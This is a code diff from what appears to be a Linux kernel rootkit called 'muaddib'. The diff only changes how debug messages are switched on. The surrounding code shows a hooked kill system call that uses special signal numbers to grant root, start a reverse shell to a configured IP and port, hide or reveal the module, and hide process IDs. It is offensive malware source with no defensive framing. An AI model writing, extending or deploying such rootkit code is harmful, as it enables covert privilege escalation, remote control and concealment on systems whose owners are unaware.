@@ -35,7 +35,7 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
     int sig = regs->si;
 
     if(sig == 64){
-        #ifdef DEBUGMSG
+        #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: giving root");
         #endif
         set_root();
@@ -43,7 +43,7 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
     }
 
     else if(sig == 42){
-        #ifdef DEBUGMSG
+        #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: starting reverse shell from kill");
         #endif
         start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
@@ -52,7 +52,7 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
 
     else if(sig == 43){
         if(hidden == 0){
-            #ifdef DEBUGMSG
+            #if DEBUGMSG == 1
             printk(KERN_INFO "muaddib: hiding");
             #endif
             hideme();
@@ -60,7 +60,7 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
             return 0;
         }
         else if(hidden == 1){
-            #ifdef DEBUGMSG
+            #if DEBUGMSG == 1
             printk(KERN_INFO "muaddib: showing");
             #endif
             showme();
@@ -69,7 +69,7 @@ asmlinkage int muaddib_kill(const struct pt_regs *regs)
         }
     }
     else if(sig == 44){
-        #ifdef DEBUGMSG
+        #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: hiding %d", pid);
         #endif
         sprintf(hide_pid, "%d", pid);
@@ -87,7 +87,7 @@ static asmlinkage int muaddib_kill(pid_t pid, int sig)
     void set_root(void);
 
     if(sig == 64){
-        #ifdef DEBUGMSG
+        #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: giving root");
         #endif
         set_root();
@@ -95,7 +95,7 @@ static asmlinkage int muaddib_kill(pid_t pid, int sig)
     }
 
     else if(sig == 42){
-        #ifdef DEBUGMSG
+        #if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: starting reverse shell from kill");
         #endif
         start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
@@ -103,13 +103,13 @@ static asmlinkage int muaddib_kill(pid_t pid, int sig)
 
     else if(sig == 43){
         if(hidden == 0){
-            #ifdef DEBUGMSG
+            #if DEBUGMSG == 1
             printk(KERN_INFO "muaddib: showing");
             #endif
             showme();
         }
         else if(hidden == 1){
-            #ifdef DEBUGMSG
+            #if DEBUGMSG == 1
             printk(KERN_INFO "muaddib: hiding");
             #endif
             hideme();
